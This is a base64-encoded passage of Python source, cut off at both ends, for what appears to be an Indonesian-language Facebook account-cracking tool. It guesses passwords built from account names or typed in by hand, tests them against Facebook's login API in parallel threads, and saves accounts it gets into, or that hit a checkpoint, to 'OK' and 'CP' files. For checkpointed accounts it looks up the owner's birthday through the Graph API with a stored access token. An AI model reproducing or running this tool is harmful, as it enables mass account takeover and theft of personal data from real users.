inaXilIFbJXPigKIlc10gJXNDcmFjayBXaXRoIFBhc3N3b3JkIERlZmF1bHQvTWFudWFsIFtkL21dJyUoTyxQLE8sUCkpDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICBmID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICBpZiBmPT0iIjoNCiAgICAgICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgIGVsaWYgZiBpbiBbJ20nLCdNJywnMicsJzAyJywnMDAyJ106DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYXBrID0gZmlsZXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZzID0gb3BlbihzZWxmLmFwaykucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCIgICAlcyIlKGUpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZmwgPSBbXQ0KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLmZzOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZmwuYXBwZW5kKHsiaWQiOmkuc3BsaXQoIuKAoiIpWzBdfSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoKCIgICAlcyIlZSkpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzRm9yIGV4YW1wbGUgOiBQYWtpc3Rhbiw3ODY3ODYsMTIzNDU2JyUoTyxQLE8sUCkpDQogICAgICAgICAgICAgICAgc2VsZi5wd2xpc3QoKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmIGYgaW4gWydkJywnRCcsJzEnLCcwMScsJzAwMSddOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFwayA9IGZpbGVzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5mcyA9IG9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgiICAgJXMiJShlKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmZsID0gW10NCiAgICAgICAgICAgICAgICAgICAgc3RhcnRfbWV0aG9kZXp6KCkNCiAgICAgICAgICAgICAgICAgICAga29waSA9IGlucHV0KCclc+KdpeKUgVslc+KAoiVzXSAlc0Nob29zZSA6ICclKE8sUCxPLFApKQ0KICAgICAgICAgICAgICAgICAgICBpZiBrb3BpIGluIFsnJ106DQogICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIGtvcGkgaW4gWycxJywnMDEnXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZsLmFwcGVuZCh7ImlkIjppLnNwbGl0KCLigKIiKVswXSwicHciOmdlbmVyYXRlMShpLnNwbGl0KCLigKIiKVsxXSl9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIGtvcGkgaW4gWycyJywnMDInXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZsLmFwcGVuZCh7ImlkIjppLnNwbGl0KCLigKIiKVswXSwicHciOmdlbmVyYXRlMihpLnNwbGl0KCLigKIiKVsxXSl9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIGtvcGkgaW4gWyczJywnMDMnXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZsLmFwcGVuZCh7ImlkIjppLnNwbGl0KCLigKIiKVswXSwicHciOmdlbmVyYXRlMyhpLnNwbGl0KCLigKIiKVsxXSl9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIGtvcGkgaW4gWyc0JywnMDQnXToNCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHBhc3MudHh0JykNCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHBhc3NhbmdrYS50eHQnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdGFtYmFoX3Bhc3MoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdGFtYmFoX3Bhc3NfYW5na2EoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gc2VsZi5mczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZmwuYXBwZW5kKHsiaWQiOmkuc3BsaXQoIuKAoiIpWzBdLCJwdyI6Z2VuZXJhdGU0KGkuc3BsaXQoIuKAoiIpWzFdKX0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgICAgICAgICBzdGFydF9tZXRob2QoKQ0KICAgICAgICAgICAgICAgICAgICBwdXQgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgICAgICAgICAgICAgICAgIGlmIHB1dCBpbiBbJyddOg0KICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4oJyVz4pWa4pWQ4pWQWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgICAgICAgICAgZWxpZiBwdXQgaW4gWycxJywnMDEnLCcwMDEnLCdhJ106DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXNCcmluZyBVcCAgQ1AgT3B0aW9uPyBbeS90XSclKE8sUCxPLFApKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHVmID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdWYgaW4gWycnXToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgcHVmIGluIFsnMScsJzAxJywnMDAxJywneScsJ1knXToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydGVkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJlYWRQb29sKDM1KS5tYXAoc2VsZi5hcGlfb3BzaSxzZWxmLmZsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycyJywnMDInLCcwMDInLCd0JywnVCddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocmVhZFBvb2woMzUpLm1hcChzZWxmLmFwaSxzZWxmLmZsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgICAgICAgICAgZWxpZiBwdXQgaW4gWycyJywnMDInLCcwMDInLCdiJ106DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXNCcmluZyBVcCAgQ1AgT3B0aW9uPyBbeS90XSclKE8sUCxPLFApKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHVmID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdWYgaW4gWycnXToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgcHVmIGluIFsnMScsJzAxJywnMDAxJywneScsJ1knXToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydGVkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJlYWRQb29sKDM1KS5tYXAoc2VsZi5tYmFzaWNfb3BzaSxzZWxmLmZsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycyJywnMDInLCcwMDInLCd0JywnVCddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocmVhZFBvb2woMzUpLm1hcChzZWxmLm1iYXNpYyxzZWxmLmZsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgICAgICAgICAgZWxpZiBwdXQgaW4gWyczJywnMDMnLCcwMDMnLCdjJ106DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXNCcmluZyB1cCBDUCBPcHRpb24/IFt5L3RdJyUoTyxQLE8sUCkpDQogICAgICAgICAgICAgICAgICAgICAgICBwdWYgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB1ZiBpbiBbJyddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGphbGFuKCclc+KVmuKVkOKVkFslcyElc10gJXNJc2kgWWFuZyBCZW5hciclKE0sUCxNLFApKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycxJywnMDEnLCcwMDEnLCd5JywnWSddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocmVhZFBvb2woMzUpLm1hcChzZWxmLmZyZWVfb3BzaSxzZWxmLmZsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycyJywnMDInLCcwMDInLCd0JywnVCddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocmVhZFBvb2woMzUpLm1hcChzZWxmLmZyZWUsc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4oJyVz4pWa4pWQ4pWQWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudSgpDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoKCIgICAlcyIlZSkpDQogICAgZGVmIHB3bGlzdChzZWxmKToNCiAgICAgICAgc2VsZi5wdyA9IGlucHV0KCclc+KdpeKUgVslc+KAoiVzXSAlc0VudGVyIFBhc3N3b3JkIDogJyUoTyxQLE8sUCkpLnNwbGl0KCIsIikNCiAgICAgICAgaWYgbGVuKHNlbGYucHcpID09MDoNCiAgICAgICAgICAgIHNlbGYucHdsaXN0KCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZmw6DQogICAgICAgICAgICAgICAgaS51cGRhdGUoeyJwdyI6c2VsZi5wd30pDQogICAgICAgICAgICBzdGFydF9tZXRob2QoKQ0KICAgICAgICAgICAgcHV0ID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICAgICAgICAgIGlmIHB1dCBpbiBbJyddOg0KICAgICAgICAgICAgICAgIGphbGFuKCclc+KVmuKVkOKVkFslcyElc10gJXNJc2kgWWFuZyBCZW5hciclKE0sUCxNLFApKQ0KICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgZWxpZiBwdXQgaW4gWycxJywnMDEnLCcwMDEnLCdhJ106DQogICAgICAgICAgICAgICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQnJpbmcgdXAgIENQIE9wdGlvbj8gW3kvdF0nJShPLFAsTyxQKSkNCiAgICAgICAgICAgICAgICBwdWYgPSBpbnB1dCgnJXPinaXilIFbJXPigKIlc10gJXNDaG9vc2UgOiAnJShPLFAsTyxQKSkNCiAgICAgICAgICAgICAgICBpZiBwdWYgaW4gWycnXToNCiAgICAgICAgICAgICAgICAgICAgamFsYW4oJyVz4pWa4pWQ4pWQWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgICAgIGVsaWYgcHVmIGluIFsnMScsJzAxJywnMDAxJywneScsJ1knXToNCiAgICAgICAgICAgICAgICAgICAgc3RhcnRlZCgpDQogICAgICAgICAgICAgICAgICAgIFRocmVhZFBvb2woMzApLm1hcChzZWxmLmFwaV9vcHNpLHNlbGYuZmwpDQogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycyJywnMDInLCcwMDInLCd0JywnVCddOg0KICAgICAgICAgICAgICAgICAgICBzdGFydGVkKCkNCiAgICAgICAgICAgICAgICAgICAgVGhyZWFkUG9vbCgzMCkubWFwKHNlbGYuYXBpLHNlbGYuZmwpDQogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgamFsYW4oJyVz4pWa4pWQ4pWQWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgZWxpZiBwdXQgaW4gWycyJywnMDInLCcwMDInLCdiJ106DQogICAgICAgICAgICAgICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQnJpbmcgdXAgQ1Agb3B0aW9uPyBbeS90XSclKE8sUCxPLFApKQ0KICAgICAgICAgICAgICAgIHB1ZiA9IGlucHV0KCclc+KdpeKUgVslc+KAoiVzXSAlc0Nob29zZSA6ICclKE8sUCxPLFApKQ0KICAgICAgICAgICAgICAgIGlmIHB1ZiBpbiBbJyddOg0KICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgbWVudSgpDQogICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycxJywnMDEnLCcwMDEnLCd5JywnWSddOg0KICAgICAgICAgICAgICAgICAgICBzdGFydGVkKCkNCiAgICAgICAgICAgICAgICAgICAgVGhyZWFkUG9vbCgzMCkubWFwKHNlbGYubWJhc2ljX29wc2ksc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICBlbGlmIHB1ZiBpbiBbJzInLCcwMicsJzAwMicsJ3QnLCdUJ106DQogICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICBUaHJlYWRQb29sKDMwKS5tYXAoc2VsZi5tYmFzaWMsc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBqYWxhbignJXPinaXilIFbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICAgICAgbWVudSgpDQogICAgICAgICAgICBlbGlmIHB1dCBpbiBbJzMnLCcwMycsJzAwMycsJ2MnXToNCiAgICAgICAgICAgICAgICBwcmludCgnJXPinaXilIFbJXPigKIlc10gJXNCcmluZyB1cCBDUCBvcHRpb24/IFt5L3RdJyUoTyxQLE8sUCkpDQogICAgICAgICAgICAgICAgcHVmID0gaW5wdXQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ2hvb3NlIDogJyUoTyxQLE8sUCkpDQogICAgICAgICAgICAgICAgaWYgcHVmIGluIFsnJ106DQogICAgICAgICAgICAgICAgICAgIGphbGFuKCclc+KVmuKVkOKVkFslcyElc10gJXNJc2kgWWFuZyBCZW5hciclKE0sUCxNLFApKQ0KICAgICAgICAgICAgICAgICAgICBtZW51KCkNCiAgICAgICAgICAgICAgICBlbGlmIHB1ZiBpbiBbJzEnLCcwMScsJzAwMScsJ3knLCdZJ106DQogICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICBUaHJlYWRQb29sKDMwKS5tYXAoc2VsZi5mcmVlX29wc2ksc2VsZi5mbCkNCiAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICBlbGlmIHB1ZiBpbiBbJzInLCcwMicsJzAwMicsJ3QnLCdUJ106DQogICAgICAgICAgICAgICAgICAgIHN0YXJ0ZWQoKQ0KICAgICAgICAgICAgICAgICAgICBUaHJlYWRQb29sKDMwKS5tYXAoc2VsZi5mcmVlLHNlbGYuZmwpDQogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgamFsYW4oJyVz4pWa4pWQ4pWQWyVzISVzXSAlc0lzaSBZYW5nIEJlbmFyJyUoTSxQLE0sUCkpDQogICAgICAgICAgICAgICAgICAgIG1lbnUoKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBqYWxhbignJXPilZrilZDilZBbJXMhJXNdICVzSXNpIFlhbmcgQmVuYXInJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICBtZW51KCkNCiAgICBkZWYgYXBpKHNlbGYsZmwpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgaSBpbiBmbC5nZXQoInB3Iik6DQogICAgICAgICAgICAgICAgbG9nID0gbG9nX2FwaShmbC5nZXQoImlkIiksDQogICAgICAgICAgICAgICAgICAgIGksImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICBpZiBsb2cuZ2V0KCJzdGF0dXMiKT09ImNwIjoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAga2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBmbC5nZXQoImlkIikgKyAiP2FjY2Vzc190b2tlbj0iICsgb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHR0ID0ganNvbi5sb2FkcyhrZS50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHRsID0gdHRbImJpcnRoZGF5Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIG0sZCx5ID0gdHRsLnNwbGl0KCIvIikNCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSBidWxhbl90dGxbbV0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMg4oCiICVzICVzICVzJXMiJShPLFAsTyxmbC5nZXQoImlkIiksaSxkLG0seSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVz4oCiJXMlcyVzIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImErIikud3JpdGUoIiVz4oCiJXPigKIlcyVzJXNcbiIlKGZsLmdldCgiaWQiKSxpLGQsbSx5KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdChLZXlFcnJvciwgSU9FcnJvcik6DQogICAgICAgICAgICAgICAgICAgICAgICBtID0gIiAiDQogICAgICAgICAgICAgICAgICAgICAgICBkID0gIiAiDQogICAgICAgICAgICAgICAgICAgICAgICB5ID0gIiAiDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICAgICAgICAgIHByaW50KCJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMlcyAgICAgIiUoTyxQLE8sZmwuZ2V0KCJpZCIpLGksdGFodW4oZmwuZ2V0KCJpZCIpKSkpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgbG9nLmdldCgic3RhdHVzIik9PSJzdWNjZXNzIjoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxyJXNbJXNSQU5BLU9LJXNdICVzIOKAoiAlcyVzICAgICAiJShILFAsSCxmbC5nZXQoImlkIiksaSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGEuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJPSy8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsc2U6Y29udGludWUNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBzZWxmLmtvKz0xDQogICAgICAgICAgICBwcmludCgiXHIlc1slc1JhbmEtQ3JhY2slc11bJXMlcy8lcyVzXVslc09LOiVzJXNdWyVzQ1A6JXMlc10lcyIlKE8sUCxPLFAsc2VsZi5rbyxsZW4oc2VsZi5mbCksTyxQLGxlbihzZWxmLmFkYSksTyxQLGxlbihzZWxmLmNwKSxPLFApLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgc2VsZi5hcGkoZmwpDQogICAgZGVmIGFwaV9vcHNpKHNlbGYsZmwpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgaSBpbiBmbC5nZXQoInB3Iik6DQogICAgICAgICAgICAgICAgbG9nID0gbG9nX2FwaShmbC5nZXQoImlkIiksDQogICAgICAgICAgICAgICAgICAgIGksImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICBpZiBsb2cuZ2V0KCJzdGF0dXMiKT09ImNwIjoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAga2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBmbC5nZXQoImlkIikgKyAiP2FjY2Vzc190b2tlbj0iICsgb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHR0ID0ganNvbi5sb2FkcyhrZS50ZXh0KQ0KICAgICAgIC